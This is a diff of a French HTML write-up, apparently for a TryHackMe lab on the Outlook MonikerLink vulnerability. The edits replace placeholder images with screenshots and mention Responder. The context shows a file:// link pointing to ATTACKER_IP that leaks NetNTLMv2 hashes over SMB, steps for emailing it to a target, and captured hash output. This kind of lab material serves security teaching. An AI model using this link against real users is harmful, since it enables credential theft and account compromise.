@@ -123,6 +123,7 @@
                                 </p>
 
                                 <h2>Présentation de la CVE</h2>
+                                <img class="img-fluid d-block mx-auto" src="../../../assets/img/rooms/EB/Screenshot_2.png"/>
                                 <ul>
                                     <li>Date de publication : 13 février 2024</li>
                                     <li>Score CVSS : 9.8 (critique)</li>
@@ -135,7 +136,6 @@
                                 <p>
                                     Les monikers sont utilisés pour accéder à des ressources externes via des protocoles comme <code>file://</code>, <code>ftp://</code> ou encore <code>ms-word://</code>. Ils sont intégrés dans les applications Microsoft (Outlook, Word…) et permettent de charger des objets COM. Cette technologie peut être abusée pour forcer l’ouverture de fichiers distants automatiquement.
                                 </p>
-                                <img src="https://example.com/image-moniker.png" alt="Exemple de moniker" style="width:60%; margin: 1em 0;" />
 
                                 <h3>Exemples de Monikers</h3>
                                 <ul>
@@ -158,9 +158,9 @@
                                 <pre><code>&lt;a href="file://ATTACKER_IP/test!exploit"&gt;Click me&lt;/a&gt;</code></pre>
 
                                 <p>
-                                    Ce lien déclenche une connexion SMB vers la machine de l’attaquant, permettant la capture d’un hash NetNTLMv2.
+                                    Ce lien déclenche une connexion SMB vers la machine de l’attaquant, permettant la capture d’un hash NetNTLMv2. Pour recevoir ces informations sur la machine attaquante, nous allons devoir utiliser un outil capable d'écouter le trafic SMB, tel que Responder.
                                 </p>
-                                <img src="https://example.com/image-link-exploit.png" alt="Lien malveillant" style="width:60%; margin: 1em 0;" />
+                                <img class="img-fluid d-block mx-auto" src="../../../assets/img/rooms/EB/Screenshot_7.png"/>
 
                                 <h2>Exploitation</h2>
                                 <p>
@@ -168,12 +168,16 @@
                                 </p>
                                 <ul>
                                     <li>Mettre votre propre IP dans le lien Moniker</li>
+                                    <img class="img-fluid d-block mx-auto" src="../../../assets/img/rooms/EB/Screenshot_10.png"/>
+
                                     <li>Utiliser l’adresse SMTP de la machine cible</li>
+                                    <img class="img-fluid d-block mx-auto" src="../../../assets/img/rooms/EB/Screenshot_11.png"/>
+
                                 </ul>
-                                <img src="https://example.com/image-script-mail.png" alt="Script d'envoi d'e-mail" style="width:60%; margin: 1em 0;" />
+                                <img class="img-fluid d-block mx-auto" src="../../../assets/img/rooms/EB/Screenshot_12.png"/>
 
                                 <p>
-                                    Une fois le mail reçu, si l’utilisateur clique sur le lien, sa machine tente d’accéder au fichier, ce qui déclenche une requête SMB interceptée par Responder ou Inveigh.
+                                    Une fois le mail reçu, si l’utilisateur clique sur le lien, sa machine tente d’accéder au fichier, ce qui déclenche une requête SMB interceptée par Responder.
                                 </p>
 
                                 <h2>Analyse de la réponse Responder</h2>
@@ -185,7 +189,7 @@
                                 [SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
                                     [SMB] NTLMv2-SSP Hash     : tryhackme::THM-MONIKERLINK:86a73f...
                                 </pre>
-                                <img src="https://example.com/image-responder.png" alt="Capture SMB via Responder" style="width:60%; margin: 1em 0;" />
+                                <img class="img-fluid d-block mx-auto" src="../../../assets/img/rooms/EB/Screenshot_15.png"/>
 
                                 <p>
                                     Ce hash peut ensuite être utilisé dans une attaque Pass-the-Hash ou craqué avec Hashcat ou John the Ripper.
